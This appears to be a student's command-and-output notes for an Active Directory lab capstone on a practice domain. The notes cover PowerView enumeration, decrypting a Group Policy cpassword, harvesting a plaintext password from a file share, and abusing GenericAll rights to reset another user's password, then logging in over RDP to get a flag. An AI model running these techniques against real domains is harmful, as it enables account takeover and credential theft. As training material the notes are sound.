@@ -1,0 +1,280 @@
+
+# AD Enumeration
+
+## 21.4.2
+
+3. **Capstone Exercise**: Start VM Group 2 and log in as _stephanie_ to CLIENT75. From CLIENT75, enumerate the object permissions for the domain users. Once weak permissions have been identified, use them to take full control over the account and use it to log in to the domain. Once logged in, repeat the enumeration process using techniques shown in this Module to obtain the flag.
+
+- Start up PowerView
+```powershell
+cd c:\tools
+
+powershell -ep bypass
+
+Import-Module .\PowerView.ps1
+```
+
+
+```powershell
+# Enumerate users
+net user /domain
+	The request will be processed at a domain controller for domain corp.com.
+	User accounts for \\DC1.corp.com
+	-------------------------------------------------------------------------------
+	Administrator            dave                     dennis
+	Guest                    iis_service              jeff
+	jeffadmin                jen                      krbtgt
+	michelle                 pete                     robert
+	stephanie
+	The command completed successfully.
+
+
+# Enumerate groups
+net group /domain
+	The request will be processed at a domain controller for domain corp.com.
+	Group Accounts for \\DC1.corp.com
+	-------------------------------------------------------------------------------
+	*Cloneable Domain Controllers
+	*Debug
+	*Development Department
+	*DnsUpdateProxy
+	*Domain Admins
+	*Domain Computers
+	*Domain Controllers
+	*Domain Guests
+	*Domain Users
+	*Enterprise Admins
+	*Enterprise Key Admins
+	*Enterprise Read-only Domain Controllers
+	*Group Policy Creator Owners
+	*Key Admins
+	*Management Department
+	*Protected Users
+	*Read-only Domain Controllers
+	*Sales Department
+	*Schema Admins
+	The command completed successfully.
+
+# Enumerate groups
+Get-NetGroup "Management Department" | select member
+	member
+	------
+	CN=jen,CN=Users,DC=corp,DC=com
+
+Get-NetGroup "Development Department" | select member
+	member
+	------
+	{CN=Management Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=dave,CN=Users,DC=corp,DC=com}
+
+
+Get-NetGroup "Sales Department" | select member
+	member
+	------
+	{CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
+
+
+Get-NetGroup "Domain Admins" | select member
+	member
+	------
+	{CN=jeffadmin,CN=Users,DC=corp,DC=com, CN=Administrator,CN=Users,DC=corp,DC=com}
+
+
+# Enumerate list of domain endpoints
+Get-NetComputer | select operatingsystem,dnshostname
+	operatingsystem              dnshostname
+	---------------              -----------
+	Windows Server 2022 Standard DC1.corp.com        #--> 192.168.165.70
+	Windows Server 2022 Standard web04.corp.com      #--> 192.168.165.72
+	Windows Server 2022 Standard FILES04.corp.com    #--> 192.168.165.73
+	Windows 11 Enterprise        client74.corp.com   #--> 192.168.165.74
+	Windows 11 Enterprise        client75.corp.com   #--> 192.168.165.75
+	Windows 10 Pro               CLIENT76.corp.com   #--> 192.168.165.76
+
+
+# Enumerate Domain Shares
+Find-DomainShare
+	Name           Type Remark                 ComputerName
+	----           ---- ------                 ------------
+	ADMIN$   2147483648 Remote Admin           DC1.corp.com
+	C$       2147483648 Default share          DC1.corp.com
+	IPC$     2147483651 Remote IPC             DC1.corp.com
+	NETLOGON          0 Logon server share     DC1.corp.com
+	SYSVOL            0 Logon server share     DC1.corp.com
+	ADMIN$   2147483648 Remote Admin           web04.corp.com
+	backup            0                        web04.corp.com
+	C$       2147483648 Default share          web04.corp.com
+	IPC$     2147483651 Remote IPC             web04.corp.com
+	ADMIN$   2147483648 Remote Admin           FILES04.corp.com
+	C                 0                        FILES04.corp.com
+	C$       2147483648 Default share          FILES04.corp.com
+	docshare          0 Documentation purposes FILES04.corp.com
+	IPC$     2147483651 Remote IPC             FILES04.corp.com
+	Tools             0                        FILES04.corp.com
+	Users             0                        FILES04.corp.com
+	Windows           0                        FILES04.corp.com
+	ADMIN$   2147483648 Remote Admin           client74.corp.com
+	C$       2147483648 Default share          client74.corp.com
+	IPC$     2147483651 Remote IPC             client74.corp.com
+	ADMIN$   2147483648 Remote Admin           client75.corp.com
+	C$       2147483648 Default share          client75.corp.com
+	IPC$     2147483651 Remote IPC             client75.corp.com
+	sharing           0                        client75.corp.com
+	ADMIN$   2147483648 Remote Admin           CLIENT76.corp.com
+	C$       2147483648 Default share          CLIENT76.corp.com
+	IPC$     2147483651 Remote IPC             CLIENT76.corp.com
+
+
+# Enumerate through SYSVOL
+dir \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy
+
+type \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+	<?xml version="1.0" encoding="utf-8"?>
+	<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+	  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+	          name="Administrator (built-in)"
+	          image="2"
+	          changed="2012-05-03 11:45:20"
+	          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
+	    <Properties
+	          action="U"
+	          newName=""
+	          fullName="admin"
+	          description="Change local admin"
+	          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+	          changeLogon="0"
+	          noChange="0"
+	          neverExpires="0"
+	          acctDisabled="0"
+	          userName="Administrator (built-in)"
+	          expires="2016-02-10" />
+	  </User>
+	</Groups>
+
+
+# Crack cpassword IN KALI
+gpp-decrypt +bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE                                                                 
+	P@$$w0rd
+
+
+# Enumerate file share
+dir \\files04\docshare\docs\do-not-share\
+
+type \\files04\docshare\docs\do-not-share\start-email.txt
+	Hi Jeff,
+	...
+	The username I''m sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11
+	...
+	Stephanie
+
+
+# Enumerate logged on users
+cd .\PSTools\
+
+.\PsLoggedon.exe \\web04
+	No one is logged on locally.
+	Unable to query resource logons
+
+
+.\PsLoggedon.exe \\files04
+	Users logged on locally:
+	     <unknown time>             CORP\jeff
+	Unable to query resource logons
+
+
+.\PsLoggedon.exe \\client74
+	Users logged on locally:
+	     <unknown time>             CORP\jeffadmin
+	Unable to query resource logons
+
+.\PsLoggedon.exe \\client75
+	Users logged on locally:
+	     <unknown time>             CORP\dave
+	     7/27/2024 11:31:15 PM      CORP\stephanie
+
+.\PsLoggedon.exe \\client76
+	Error opening HKEY_USERS for \\client76
+	Users logged on via resource shares:
+	     7/27/2024 11:33:57 PM      CORP\stephanie
+
+
+# Get list of all GenericAll SIDs for stephanie
+Get-ObjectAcl -Identity "stephanie" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+	SecurityIdentifier                           ActiveDirectoryRights
+	------------------                           ---------------------
+	S-1-5-21-1987370270-658905905-1781884369-512            GenericAll
+	S-1-5-32-548                                            GenericAll
+	S-1-5-18                                                GenericAll
+	S-1-5-21-1987370270-658905905-1781884369-519            GenericAll
+
+# Get list of all GenericAll SIDs for jeff
+Get-ObjectAcl -Identity "jeff" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+	SecurityIdentifier                           ActiveDirectoryRights
+	------------------                           ---------------------
+	S-1-5-21-1987370270-658905905-1781884369-512            GenericAll
+	S-1-5-32-548                                            GenericAll
+	S-1-5-18                                                GenericAll
+	S-1-5-21-1987370270-658905905-1781884369-519            GenericAll
+
+
+# Convert SIDs to group names
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-512
+	CORP\Domain Admins
+
+Convert-SidToName S-1-5-32-548
+	BUILTIN\Account Operators
+
+Convert-SidToName S-1-5-18
+	Local System
+
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-519
+	CORP\Enterprise Admins
+
+
+# Try a different way...  (got from Discord)
+Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
+	IdentityReferenceName ActiveDirectoryRights             AceType ObjectDN
+	--------------------- ---------------------             ------- --------
+	DC1$                             GenericAll AccessAllowedObject CN=DFSR-LocalSettings,CN=DC1,OU=Domain Controllers,DC=cor...
+	DC1$                             GenericAll AccessAllowedObject CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC1,OU=D...
+	DC1$                             GenericAll AccessAllowedObject CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-Lo...
+	stephanie                        GenericAll       AccessAllowed CN=Management Department,DC=corp,DC=com
+	stephanie                        GenericAll       AccessAllowed CN=robert,CN=Users,DC=corp,DC=com
+
+
+# Enumerate robert
+Get-ObjectAcl -Identity "robert" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+	SecurityIdentifier                            ActiveDirectoryRights
+	------------------                            ---------------------
+	S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
+	S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
+	S-1-5-32-548                                             GenericAll
+	S-1-5-18                                                 GenericAll
+	S-1-5-21-1987370270-658905905-1781884369-519             GenericAll
+
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+	CORP\stephanie
+
+
+# Change robert's password (need `net user` as PS requires old password & otherwise errors out)
+ net user robert P@ssword /domain
+	The request will be processed at a domain controller for domain corp.com.
+	The command completed successfully.
+
+
+# Login to \\client74
+xfreerdp /cert-ignore /compression /auto-reconnect /u:robert /p:P@ssword /d:corp.com /v:192.168.208.74
+
+##### In new RDP window
+powershell.exe
+
+Start-Process powershell.exe -Verb runas
+
+# In new PS window
+Get-ChildItem -Path C:\ -Filter proof.txt -Recurse -ErrorAction SilentlyContinue -Force
+	    Directory: C:\Users\administrator\Desktop
+	Mode                 LastWriteTime         Length Name
+	----                 -------------         ------ ----
+	-a----         7/28/2024   8:01 PM             78 proof.txt
+
+type C:\Users\administrator\Desktop\proof.txt
+```
